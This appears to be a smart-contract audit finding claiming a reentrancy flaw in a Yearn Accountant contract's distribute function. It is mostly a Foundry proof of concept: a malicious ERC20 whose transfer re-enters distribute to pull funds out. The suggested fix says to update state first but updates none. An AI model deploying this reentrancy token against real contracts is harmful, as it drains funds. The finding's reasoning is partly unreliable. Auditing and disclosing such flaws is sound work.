# [H-01] Incorrect CEI Pattern in distribute Function Allows Reentrancy and Fund Drainage

### [H-01] Incorrect CEI Pattern in `Accountant::distribute` Function Allows Reentrancy and Fund Drainage

**Description:** 
The `distribute` function in the `Accountant` contract is vulnerable to reentrancy attacks. The function makes external calls to transfer tokens before updating state variables, which can be exploited by malicious tokens to reenter the function and drain funds. This occurs because the function follows an incorrect pattern of making external calls before state updates.

LOC: `https://github.com/sherlock-audit/2025-05-yearn-ybold/blob/main/yv3-liquityv2-sp-strategy/src/periphery/Accountant.sol#L369`

**Impact:** 
- High severity as it can lead to direct fund loss
- Attackers can drain funds from the Accountant contract
- The vulnerability affects all token distributions

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {Accountant} from "../periphery/Accountant.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {console} from "forge-std/console.sol";

// Malicious token that demonstrates reentrancy
contract MaliciousToken is ERC20 {
    Accountant public accountant;
    uint256 public reentrancyCount;
    bool public isReentering;

    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000 ether);
    }

    function setAccountant(address _accountant) external {
        accountant = Accountant(_accountant);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (!isReentering && to == address(accountant)) {
            isReentering = true;
            // Try to reenter distribute multiple times
            for(uint i = 0; i < 5; i++) {
                try accountant.distribute(address(this), 1 ether) {
                    reentrancyCount++;
                } catch {
                    // If reentrancy fails, stop trying
                    break;
                }
            }
            isReentering = false;
        }
        return super.transfer(to, amount);
    }

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Mock ERC20 with mint function for testing
contract MintableERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract ReentrancyTest is Test {
    Accountant public accountant;
    MaliciousToken public maliciousToken;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        
        // Deploy contracts
        maliciousToken = new MaliciousToken();
        accountant = new Accountant(
            owner,  // feeManager
            address(maliciousToken),  // feeRecipient (malicious token)
            1000,  // defaultMaxGain (10%)
            1000   // defaultMaxLoss (10%)
        );
        
        // Set up malicious token
        maliciousToken.setAccountant(address(accountant));
        
        // Set up initial state
        vm.startPrank(owner);
        accountant.addVault(address(maliciousToken));
        maliciousToken.mint(address(accountant), 10 ether);
        vm.stopPrank();
    }

    function testReentrancyVulnerability() public {
        // Start as feeRecipient (malicious token)
        vm.startPrank(address(maliciousToken));
        
        // Record initial balances
        uint256 initialAccountantBalance = maliciousToken.balanceOf(address(accountant));
        uint256 initialMaliciousBalance = maliciousToken.balanceOf(address(maliciousToken));
        
        console.log("=== Before Attack ===");
        console.log("Accountant balance:", maliciousToken.balanceOf(address(accountant)));
        console.log("Malicious token balance:", maliciousToken.balanceOf(address(maliciousToken)));
        
        // Trigger reentrancy attack
        maliciousToken.transfer(address(accountant), 1 ether);
        
        // Verify the reentrancy attack succeeded
        assertEq(maliciousToken.reentrancyCount(), 5, "Reentrancy should succeed 5 times");
        
        console.log("\n=== After Attack ===");
        console.log("Reentrancy count:", maliciousToken.reentrancyCount());
        console.log("Accountant balance:", maliciousToken.balanceOf(address(accountant)));
        console.log("Malicious token balance:", maliciousToken.balanceOf(address(maliciousToken)));
        
        // Verify balances
        assertEq(
            maliciousToken.balanceOf(address(accountant)),
            initialAccountantBalance - 4 ether, // -5 ETH from reentrancy + 1 ETH from transfer
            "Accountant balance should be reduced by reentrant distributes minus initial transfer"
        );
        assertEq(
            maliciousToken.balanceOf(address(maliciousToken)),
            initialMaliciousBalance + 4 ether, // +5 ETH from reentrancy - 1 ETH from transfer
            "Malicious token balance should be increased by reentrant distributes minus initial transfer"
        );
        
        vm.stopPrank();
    }

    function testDistributeNormalOperation() public {
        // Deploy a normal ERC20 token with minting ability
        MintableERC20 normalToken = new MintableERC20("Normal", "NOR");
        
        // Set up Accountant with test contract as fee recipient
        Accountant normalAccountant = new Accountant(
            owner,  // feeManager
            address(this),  // feeRecipient (test contract)
            1000,  // defaultMaxGain (10%)
            1000   // defaultMaxLoss (10%)
        );
        
        // Set up initial state
        vm.startPrank(owner);
        normalAccountant.addVault(address(normalToken));
        vm.stopPrank();
        
        // Mint and transfer tokens
        normalToken.mint(address(this), 100 ether);
        normalToken.transfer(address(normalAccountant), 10 ether);
        
        // Start as feeRecipient (test contract)
        vm.startPrank(address(this));
        
        // This should succeed
        normalAccountant.distribute(address(normalToken), 1 ether);
        
        // Verify the transfer happened
        // Initial balance (100) - sent to accountant (10) + received from accountant (1) = 91
        assertEq(normalToken.balanceOf(address(this)), 91 ether);
        
        vm.stopPrank();
    }
}
```

**Recommended Mitigation:**
1. Implement the checks-effects-interactions pattern:
```solidity
function distribute(address token, uint256 amount) external nonReentrant {
    require(amount > 0, "Zero amount");
    require(token != address(0), "Zero token address");
    
    // Update state first
    uint256 balance = ERC20(token).balanceOf(address(this));
    require(balance >= amount, "Insufficient balance");
    
    // Then make external call
    ERC20(token).safeTransfer(feeRecipient, amount);
    
    // Emit event last
    emit DistributeRewards(token, amount);
}
```
